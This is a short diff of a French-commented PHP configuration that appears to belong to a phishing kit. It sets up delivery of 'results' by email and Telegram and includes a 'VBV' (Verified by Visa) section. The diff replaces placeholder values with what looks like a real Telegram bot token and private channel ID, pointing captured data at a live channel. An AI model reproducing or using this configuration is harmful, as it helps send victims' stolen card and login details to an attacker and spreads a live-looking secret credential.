@@ -8,9 +8,9 @@ $rezmail = "email@email.com";
 
 #Telegram
 $tlg_send = true;                                       # False pour ne pas recevoir par Telegram
-$bot_token = "71289jhkgjhgjgjkgjk";
+$bot_token = "8712281940:AAGvbS6l8Aoyz-vaxKV79Kw1wGVeQNUBf3k";
 
-$rez_chat = "ujfjfjhfjh0";                                 # Channel de réception des informations
+$rez_chat = "-1003785770729";                                 # Channel de réception des informations
 
 # VBV
 
